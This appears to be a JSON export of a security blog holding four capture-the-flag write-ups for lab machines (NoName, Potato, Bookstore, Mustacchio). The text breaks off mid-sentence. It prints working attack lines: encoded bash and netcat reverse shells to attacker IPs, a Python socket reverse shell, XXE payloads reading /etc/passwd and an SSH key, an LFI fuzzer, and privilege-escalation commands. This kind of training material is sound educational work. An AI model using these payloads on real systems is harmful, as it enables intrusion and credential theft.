[{"content":"NoName is an intermediate rated Proving Grounds Play machine that covers command injection and SUID privesc.\nNMAP PORT STATE SERVICE 80/tcp open http Port 80 Enumeration I started with my usual enumeration of http with Nikto and Gobuster. Nikto did not return anthing interesting while Gobuster returned admin and superadmin.php.\nChecking theadmin endpoint only shows pictures posted with no additional functionality, the superadmin.php looks more interesting as looks like there is a ping functionality that we can play with.\nIntercepting the request with burp we can see two parameters pinger and submitt. pinger looks really interesting and is screaming command injection :p\nTrying command injection with sleep command. I tried to chain using ; and \u0026amp; but it did not work, while trying | worked.\nAs we can see at the bottom of the screenshot we were able to successfully inject the sleep command resulting to a five second delay in the response.\nNow that we have confirmed the command injection vulnerability we can now try some basic reverse shell payload. I tried the bash, nc, and python payloads but nothing worked. I also tried ls, pwd, and cat /etc/passwd but it also did not return anything, so I tried cat superadmin.php and the response returned the following:\n\u0026lt;?php if (isset($_POST[\u0026#39;submitt\u0026#39;])) { $word=array(\u0026#34;;\u0026#34;,\u0026#34;\u0026amp;\u0026amp;\u0026#34;,\u0026#34;/\u0026#34;,\u0026#34;bin\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34; \u0026amp;\u0026amp;\u0026#34;,\u0026#34;ls\u0026#34;,\u0026#34;nc\u0026#34;, \u0026#34;dir\u0026#34;,\u0026#34;pwd\u0026#34;); $pinged=$_POST[\u0026#39;pinger\u0026#39;]; $newStr = str_replace($word, \u0026#34;\u0026#34;, $pinged); if(strcmp($pinged, $newStr) == 0) { $flag=1; } else { $flag=0; } } if ($flag==1){ $outer=shell_exec(\u0026#34;ping -c 3 $pinged\u0026#34;); echo \u0026#34;\u0026lt;pre\u0026gt;$outer\u0026lt;/pre\u0026gt;\u0026#34;; } ?\u0026gt; Looks like there are blacklisted characters and binaries, that\u0026rsquo;s why we can\u0026rsquo;t ls and cat /etc/passwd. From here I thought we can try try echoing a base64 encoded command then pipe it to base64 -d then to bash. Something like the following:\necho \u0026#39;Y2F0IC9ldGMvcGFzc3dk\u0026#39; | base64 -d | bash` And it worked, so I tried with a reverse shell\nbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.49.210/80 0\u0026gt;\u0026amp;1 For some reason the following base64 encoded reverse shell payload still did not work:\n|echo \u0026#39;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjIxMC84MCAwPiYx\u0026#39;|base64 -d|bash Which is really weird, So to troubleshoot I tried removing the last |bash part in my payload so it will print the base64 decoded payload instead of executing it with bash, and I got the following response\nLooks like it is not printing the whole base64 encoded command. not sure why but that\u0026rsquo;s the reason our reverse shell is not getting executed properly. From here I tried double base64 encoding my payload and it worked\n|echo \u0026#39;WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqSXhNQzg0TUNBd1BpWXg=\u0026#39;|base64 -d|base64 -d|bash` Privesc Now we have a shell as www-data first thing I check usually is the SUIDs. I noticed /usr/bin/find not sure if it is normal but I checked in GTFObins and looks like we can privesc using this command.\nUsing the following command find . -exec /bin/sh \\; -quit gave us root access to the box.\n","permalink":"https://blog.allenxd.com/posts/noname/","summary":"\u003cp\u003eNoName is an intermediate rated Proving Grounds Play machine that covers command injection and SUID privesc.\u003c/p\u003e","title":"NoName - Proving Grounds"},{"content":"Potato is an easy rated Proving Grounds Play machine that covers LFI and command injection.\nNMAP PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA) | 256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA) |_ 256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Potato company |_http-server-header: Apache/2.4.41 (Ubuntu) 2112/tcp open ftp ProFTPD | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 901 Aug 2 2020 index.php.bak |_-rw-r--r-- 1 ftp ftp 54 Aug 2 2020 welcome.msg Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Checking FTP first and then downloading both files. ftp 192.168.243.101 2112\nindex.php.bak\n\u0026lt;?php $pass= \u0026#34;potato\u0026#34;; //note Change this password regularly if($_GET[\u0026#39;login\u0026#39;]===\u0026#34;1\u0026#34;){ if (strcmp($_POST[\u0026#39;username\u0026#39;], \u0026#34;admin\u0026#34;) == 0 \u0026amp;\u0026amp; strcmp($_POST[\u0026#39;password\u0026#39;], $pass) == 0) { echo \u0026#34;Welcome! \u0026lt;/br\u0026gt; Go to the \u0026lt;a href=\\\u0026#34;dashboard.php\\\u0026#34;\u0026gt;dashboard\u0026lt;/a\u0026gt;\u0026#34;; setcookie(\u0026#39;pass\u0026#39;, $pass, time() + 365*24*3600); }else{ echo \u0026#34;\u0026lt;p\u0026gt;Bad login/password! \u0026lt;/br\u0026gt; Return to the \u0026lt;a href=\\\u0026#34;index.php\\\u0026#34;\u0026gt;login page\u0026lt;/a\u0026gt; \u0026lt;p\u0026gt;\u0026#34;; } exit(); } ?\u0026gt; \u0026lt;form action=\u0026#34;index.php?login=1\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Login\u0026lt;/h1\u0026gt; \u0026lt;label\u0026gt;\u0026lt;b\u0026gt;User:\u0026lt;/b\u0026gt;\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; required\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;label\u0026gt;\u0026lt;b\u0026gt;Password:\u0026lt;/b\u0026gt;\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; required\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; id=\u0026#39;submit\u0026#39; value=\u0026#39;Login\u0026#39; \u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; the authentication uses strcmp which I think can be bypassed\nLet\u0026rsquo;s check the web app.\ntrying out admin:potato did not work. So I searched on how to bypass strcmp and found this article doyler\nadding [] to the password param worked and we are logged in\nThere is a ping function. So I checked that first and tried some basic command injections, but nothing worked. I tried to do some LFI in the page parameter as well but did not return anything.\nI checked the logs function and it looks like it prints the contents of the chosen log. I checked burp and there is a file parameter. Tried LFI with /etc/passwd and it worked.\nWe got two users from the /etc/passwd file.\nwebadmin florianges\nI checked their .ssh folder for any sshkey but nothing. The webadmin user also has its password webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash So I cracked it\nTried ssh but did not work.\nI tried to read dashboard.php and noticed that it is executing commands using shell_exec\nI think this is executing cat against logs/+whatever is in the file param So maybe we can also chain another command after the cat execution.\nI tried sleep 5 and I got a 5 second delay. so tried whoami\nAnd we got command execution.\nTried a netcat reverse shell and it worked. file=;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2\u0026gt;%261|nc+192.168.49.243+80+\u0026gt;/tmp/f\nI ran linpeas.sh but nothing interesting. and then I remember we have creds for webadmin I tried to su webadmin and it worked. I added my sshkey to webadmin's ssh folder for a better shell.\nFirst thing I tried is check my sudo rights as we have creds. (ALL : ALL) /bin/nice /notes/* Here we can se we can run the command nice against anything in the /notes directory. so I tried sudo /bin/nice /notes/../../../../../usr/bin/whoami and the output was root so it did run whoami as root as it only checks the initial /notes and does not care if I go back a directory. From here we can just run /bin/bash\nAnd we are root!~\n","permalink":"https://blog.allenxd.com/posts/potato/","summary":"\u003cp\u003ePotato is an easy rated Proving Grounds Play machine that covers LFI and command injection.\u003c/p\u003e","title":"Potato - Proving Grounds"},{"content":"Medium rated TryHackMe achine that covers some basic API pentesting, fuzzing the API using our own python script to gain User access and analyzing a C program using Ghidra to escalate privilege to Root.\nNMAP All Ports Nmap scan report for 10.10.254.205 Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA) | 256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA) |_ 256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Book Store 5000/tcp open http Werkzeug httpd 0.14.1 (Python 3.6.9) | http-robots.txt: 1 disallowed entry |_/api \u0026lt;/p\u0026gt; |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Full Scan Active Ports tarting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 19:44 NZDT Nmap scan report for 10.10.155.203 Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA) | 256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA) |_ 256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Book Store |_http-server-header: Apache/2.4.29 (Ubuntu) 5000/tcp open upnp? Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 4 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel User From our NMAP scan I first checked port 80 and we can see a Website called Book Store. Nothing too interesting from here I also ran Gobuster and Nikto which did not give us anything juicy.\nThere is a /login.html though but the login function does not seem to work. I checked the source and there is an interesting comment.\n\u0026lt;!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid\u0026#39;s bash history file --\u0026gt; We will keep this in mind just in case we can use it later.\nNow I moved to checking port 5000. Looks like it\u0026rsquo;s used for API.\nI ran gobuster against this and we can see that we have the following pages.\n/api (Status: 200) [Size: 825] /console (Status: 200) [Size: 1985] I tried accessing /console but it needs a PIN. Like what is mentioned from the html comment earlier.\nI checked /api and we can see a documentation on how to use the API.\n![Port5000-APIdoc]/assets/images/thm/bookstore/3.png \u0026ldquo;API Doc\u0026rdquo;)\nI tried accessing /api/v2/resources/books?id=1 and it gave me a json result\n[ { \u0026#34;author\u0026#34;: \u0026#34;Ann Leckie \u0026#34;, \u0026#34;first_sentence\u0026#34;: \u0026#34;The body lay naked and facedown, a deathly gray, spatters of blood staining the snow around it.\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;published\u0026#34;: 2014, \u0026#34;title\u0026#34;: \u0026#34;Ancillary Justice\u0026#34; } ] Now we can try to check if there are other parameters supported by replacing the id parameter.\nI created a little python script to do this. First I tried /api/v2/resources/books?\u0026lt;params\u0026gt;=../../../../etc/passwd but did not find anything so I changed v2 to v1 and it worked. /api/v1/resources/books?\u0026lt;params\u0026gt;=../../../../etc/passwd\nimport requests import sys proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} #proxy for burp def set_session(): global req global ses global url ses = requests.Session() url = \u0026#34;http://10.10.87.239:5000\u0026#34; try: req = ses.get(url) except: print(\u0026#34;Unable to fetch URL\u0026#34;) sys.exit() set_session() dir = \u0026#39;/api/v1/resources/books?id=../../../../../../../etc/passwd\u0026#39; #dir to bruteforce with open(\u0026#39;/home/all3n/tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt\u0026#39;) as p: #open raft and replace id from dir for fuzz in p: fuzz = fuzz.strip() dir_rep = dir.replace(\u0026#34;id\u0026#34;, fuzz, 1) url_dir = url + dir_rep res = ses.get(url_dir, proxies=proxies) print(res.status_code) print(url_dir) if res.status_code == 404: sys.stdout.write(\u0026#34;\\033[F\u0026#34;) #cursor up oneline sys.stdout.write(\u0026#34;\\033[K\u0026#34;) #clear things sys.stdout.write(\u0026#34;\\033[F\u0026#34;) #cursor up oneline sys.stdout.write(\u0026#34;\\033[K\u0026#34;) #clear things if res.status_code == 200: continue print(dir_rep) print(res.text) ┌──(all3n㉿kali)-[~/thm/bookstore] └─$ curl http://10.10.87.239:5000/api/v1/resources/books?\u0026lt;redacted\u0026gt;=../../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash sshd:x:110:65534::/run/sshd:/usr/sbin/nologin Now we confirmed that we have an LFI vulnerability. Earlier there is a console that needs a PIN, we can now try including sid\u0026rsquo;s .bash_history to checked if the PIN is in there.\n┌──(all3n㉿kali)-[~/thm/bookstore] └─$ curl http://10.10.87.239:5000/api/v1/resources/books?show=../../../../home/sid/.bash_history cd /home/sid whoami export WERKZEUG_DEBUG_PIN=\u0026lt;redacted\u0026gt; echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit And there is the PIN. Now let\u0026rsquo;s try to use it in /console.\nAnd we are in! Now let\u0026rsquo;s try to do a python reverse shell. First set up a listener to our machine.\nimport socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;\u0026lt;your-IP\u0026gt;\u0026#34;,\u0026lt;port\u0026gt;)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]) ┌──(all3n㉿kali)-[~/thm/bookstore] └─$ nc -lvnp 9001 listening on [any] 9001 ... connect to [10.4.14.51] from (UNKNOWN) [10.10.87.239] 36176 10.4.14.51 - - [22/Jan/2022 13:57:33] \u0026#34;GET /console?__debugger__=yes\u0026amp;cmd=os.dup2(s.fileno()%2C2)\u0026amp;frm=0\u0026amp;s=Lh2xU4dH39FzXlFlvUh2 HTTP/1.1\u0026#34; 200 - /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ ROOT And we have a shell as sid! Now the first thing I did is to create an SSH key and save to sid\u0026rsquo;s /.ssh/authorized_keys file so we I can ssh.\nsid@bookstore:~$ ls api.py api-up.sh books.db try-harder user.txt From here we can first notice the *try-harder file. I tried executing it but it wants a magic number\nsid@bookstore:~$ ./try-harder What\u0026#39;s The Magic Number?! 69 Incorrect Try Harder I ran strings against it and it has this interesting lines.\nWhat\u0026#39;s The Magic Number?! /bin/bash -p Incorrect Try Harder I downloaded the try-harder file and analyzed it using Ghidra\nvoid main(void) { long in_FS_OFFSET; uint local_1c; uint local_18; uint local_14; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); setuid(0); local_18 = 0x5db3; puts(\u0026#34;What\\\u0026#39;s The Magic Number?!\u0026#34;); __isoc99_scanf(\u0026amp;DAT_001008ee,\u0026amp;local_1c); local_14 = local_1c ^ 0x1116 ^ local_18; if (local_14 == 0x5dcd21f4) { system(\u0026#34;/bin/bash -p\u0026#34;); } else { puts(\u0026#34;Incorrect Try Harder\u0026#34;); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } From here we can see that it has four variables and they have assigned hex numbers and we want to XOR the values. Tf is XOR\nlocal_14 = local_1c ^ 0x1116 ^ local_18;\nLooks like we have to trigger the following to get root.\nif (local_14 == 0x5dcd21f4) { system(\u0026#34;/bin/bash -p\u0026#34;); I used an online XOR calc to do this and after getting the result and entering it as the magic number.\nsid@bookstore:~$ ./try-harder What\u0026#39;s The Magic Number?! 1******** root@bookstore:~# We have root!\n","permalink":"https://blog.allenxd.com/posts/bookstore/","summary":"\u003cp\u003eMedium rated TryHackMe achine that covers some basic API pentesting, fuzzing the API using our own python script to gain User access and analyzing a C program using \u003cstrong\u003e\u003cem\u003eGhidra\u003c/em\u003e\u003c/strong\u003e to escalate privilege to Root.\u003c/p\u003e","title":"Bookstore - TryHackMe"},{"content":"A TryHackMe machine that covers XXE vulnerability to read sensitive user info like ssh-keys, this machine also covers some basic hash cracking while the privilege escalation will use a Path Variable vulnerability in a log_monitoring program.\nNMAP Initial Scan Initial Nmap\nNmap scan report for 10.10.123.254 Host is up (0.29s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA) | 256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA) |_ 256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) | http-robots.txt: 1 disallowed entry |_/ |_http-title: Mustacchio | Home Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Android 4.1.1 (86%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.95 seconds All Ports Scan All Ports Nmap\nNmap scan report for 10.10.123.254 Host is up (0.29s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8765/tcp open ultraseek-http From our NMAP results we can see that we have two web server ports open. Browsing to port 80 gives us this web server.\nWhile port 8765 brings us to a log in page.\nBecause we have a web server it is always a good idea to run gobuster and nikto in the background while browsing the web server.\nNikto Scan Port 80\n+ Server: Apache/2.4.18 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use \u0026#39;-C all\u0026#39; to force check all possible dirs) + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is \u0026#34;127.0.0.1\u0026#34;. + Server may leak inodes via ETags, header found with file /, inode: 6d8, size: 5c4938d5d4e40, mtime: gzip + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + OSVDB-3268: /images/: Directory indexing found. + OSVDB-3233: /icons/README: Apache default file found. + 7889 requests: 0 error(s) and 9 item(s) reported on remote host + End Time: 2022-01-19 22:10:55 (GMT13) (2407 seconds) Nikto Scan Port 8765\n+ Server: nginx/1.10.3 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use \u0026#39;-C all\u0026#39; to force check all possible dirs) + nginx/1.10.3 appears to be outdated (current is at least 1.14.0) + Cookie PHPSESSID created without the httponly flag + 7891 requests: 0 error(s) and 5 item(s) reported on remote host + End Time: 2022-01-19 22:10:24 (GMT13) (2354 seconds) Gobuster Port 80\n/images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.129.75/images/] /. (Status: 200) [Size: 1752] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.129.75/fonts/] /custom (Status: 301) [Size: 313] [--\u0026gt; http://10.10.129.75/custom/] Gobuster Port 8765\n/assets (Status: 301) [Size: 194] [--\u0026gt; http://10.10.129.75:8765/assets/] /auth (Status: 301) [Size: 194] [--\u0026gt; http://10.10.129.75:8765/auth/] USER I tried several SQLi payloads against the login form but failed to bypass authentication. So let\u0026rsquo;s go back and browse the web app again to find anything interesting.\nBrowsing through the page does not give us anything interesting. Our Nikto scans didn\u0026rsquo;t really give us anything aswell. Gobuster showed us that there is a /custom directory, and inside that directory we can see js and css normally we won\u0026rsquo;t really find anything interesting in these folders but in this case there is a users.bak file inside the js directory. Let\u0026rsquo;s download the file and inspect it locally.\nRunning strings command against users.bak gave us this output.\n┌──(all3n㉿kali)-[~/thm/mustacchio] └─$ strings users.bak SQLite format 3 tableusersusers CREATE TABLE users(username text NOT NULL, password text NOT NULL) ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b We can see that it looks like there is credentials here admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b\nUsing hashid looks like its Sha1.\n┌──(all3n㉿kali)-[~/thm/mustacchio] └─$ hashid 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b Analyzing \u0026#39;1868e36a6d2b17d4c2745f1659433a54d4bc5f4b\u0026#39; [+] SHA-1 [+] Double SHA-1 [+] RIPEMD-160 [+] Haval-160 [+] Tiger-160 [+] HAS-160 [+] LinkedIn [+] Skein-256(160) [+] Skein-512(160) Let\u0026rsquo;s try cracking it using hashcat. Going back to my host machine and then running hashcat.exe -m 100 mustacchio.txt rockyou.txt. Where:\n-m 100 = Sha1 Hashcat Formats after a few seconds we have the result.\n1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:\u0026lt;redacted\u0026gt; Now we can test if this credential will work on port 8765\nAnd we are in!\nI tried sending test and then intercepting the request using burp. And it looks like we have a post request that needs xml value as data.\nThere are also interesting parts in the response. These two comments:\n//document.cookie = \u0026#34;Example=/auth/dontforget.bak\u0026#34;; \u0026lt;!-- Barry, you can now SSH in using your key!--\u0026gt; And this part of the http response:\n\u0026lt;/form\u0026gt; \u0026lt;h3\u0026gt;Comment Preview:\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Name: \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Author : \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Comment :\u0026lt;br\u0026gt; \u0026lt;p/\u0026gt; \u0026lt;/section\u0026gt; From this it looks like we will have to do an XXE Injection. Payload all the things\nI tried several payloads inserting Name, Author and Comment but failed.\nSo let\u0026rsquo;s try browsing to /auth/dontforget.bak then we can see that we\u0026rsquo;re able to download a file.\n┌──(all3n㉿kali)-[~/thm/mustacchio] └─$ strings dontforget.bak \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;Joe Hamd\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Barry Clad\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; I did not immediately notice but this contains an XML file that we can probably use for our XXE payload so let\u0026rsquo;s try that.\nI copied the whole contents of the file and submitted it as comment and we can see that it worked.\nNow let\u0026rsquo;s edit the xml contents and try reading /etc/passwd using the following payload.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt;]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Barry Clad\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; And it worked! As we can see the name part has been replaced with the contents of /etc/passwd\nAs we saw from the output of /etc/passwd we have a user barry I tried accessing his home directory and reading user.txt\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///home/barry/user.txt\u0026#34; \u0026gt;]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Barry Clad\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; And we have the user flag! from here we can also try if barry has .ssh directory and then try reading his private ssh key.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///home/barry/.ssh/id_rsa\u0026#34; \u0026gt;]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Barry Clad\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; And we have barry\u0026rsquo;s 